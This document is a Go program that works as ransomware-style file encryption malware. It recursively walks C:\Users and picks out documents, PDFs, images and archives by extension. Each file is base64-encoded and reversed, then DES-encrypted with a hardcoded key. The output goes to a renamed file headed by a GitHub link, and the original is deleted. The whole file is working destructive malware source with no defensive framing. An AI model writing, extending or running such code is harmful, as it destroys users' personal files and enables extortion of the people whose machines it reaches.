package main

import (
	"bytes"
	"crypto/cipher"
	"crypto/des"
	"encoding/base64"
	"github.com/shirou/gopsutil/disk"
	"io/ioutil"
	"os"
	"path"
	"strings"
)

var (
	WhiteList = map[string]string{ //加密文件白名单
		//document
		"word_before":  ".doc",
		"word_after":   ".docx",
		"excel_before": ".xls",
		"excel_afte":   ".xlsx",
		"powerpoint":   ".pptx",
		"pdf":          ".pdf",
		"wps_on":       ".dot",
		"wps_two":      ".dotx",
		//images
		"images1": ".jpg",
		"images2": ".jpeg",
		"images3": ".png",
		"images4": ".gif",
		"images5": ".bmp",
		"images6": ".tiff",
		"images7": ".ai",
		"images8": ".cdr",
		"images9": ".eps",
		//compression
		"rar": ".rar",
		"7z":  ".7z",
		"zip": ".zip",
	}
	AllDesk, _ = disk.IOCounters()  //获取所有盘符
	key        = []byte("4nbEcTOS") //密钥
)

func Del_File(fileName string) {
	err := os.Remove(fileName)
	if err != nil {
		return
	}
}

func Write_File(fileName string, DESContent []byte) {
	content := `https://github.com/RuanLang0777/Smallfat` + "\r\n\r\n" + base64.StdEncoding.EncodeToString(DESContent)
	baseName := path.Base(fileName)           // 获取文件名+后缀
	ext := path.Ext(baseName)                 // 获取后缀
	name := strings.TrimSuffix(baseName, ext) //获取文件名
	err := ioutil.WriteFile(name + "_" + ext, []byte(content), 0777)
	Del_File(fileName)
	if err != nil {
		return
	}
}

func Base64(fileName string) []byte {
	//Base64编码->反转->Base64编码
	file_byte, _ := ioutil.ReadFile(fileName)
	encryption := base64.StdEncoding.EncodeToString(file_byte)
	Reverses := Reverse(encryption)
	Reverses_encryption := base64.StdEncoding.EncodeToString([]byte(Reverses))
	return []byte(Reverses_encryption)

}

func MyDESEncrypt(origData, key []byte) string {
	block, _ := des.NewCipher(key)
	origData = PKCS5Padding(origData, block.BlockSize())
	blockMode := cipher.NewCBCEncrypter(block, key)
	crypted := make([]byte, len(origData))
	blockMode.CryptBlocks(crypted, origData)
	return base64.StdEncoding.EncodeToString(crypted)

}

func PKCS5Padding(ciphertext []byte, blockSize int) []byte {
	padding := blockSize - len(ciphertext)%blockSize
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(ciphertext, padtext...)
}

func Reverse(enbase64 string) string {
	//反转
	a := []rune(enbase64)
	for i, j := 0, len(a)-1; i < j; i, j = i+1, j-1 {
		a[i], a[j] = a[j], a[i]
	}
	return string(a)
}

func WalkDir(filepath string) ([]string, error) {
	//递归遍历
	files, _ := ioutil.ReadDir(filepath)               
	var allfile []string                               
	filepath = strings.Replace(filepath, `\\`, `\`, 1) 
	for _, v := range files {
		fullPath := filepath + "\\" + v.Name() 
		if v.IsDir() {                         
			a, _ := WalkDir(fullPath) 
			allfile = append(allfile, a...)
		} else {
			allfile = append(allfile, fullPath) 
		}
	}

	return allfile, nil
}

func Find_File() {
	for diskname, _ := range AllDesk {
		if diskname == "C:" {
			paths := diskname + "\\" + "Users"
			files, _ := WalkDir(paths)
			for _, fileName := range files {
				SuffixName := path.Ext(fileName) //获取文件后缀名
				for _, SuffixVule := range WhiteList {
					if SuffixName == SuffixVule {
						Base64Content := Base64(fileName)
						DESContent := MyDESEncrypt(Base64Content, key)
						Write_File(fileName, []byte(DESContent))
					}
				}
			}
		}
	}
}

func main() {
	Find_File()
}
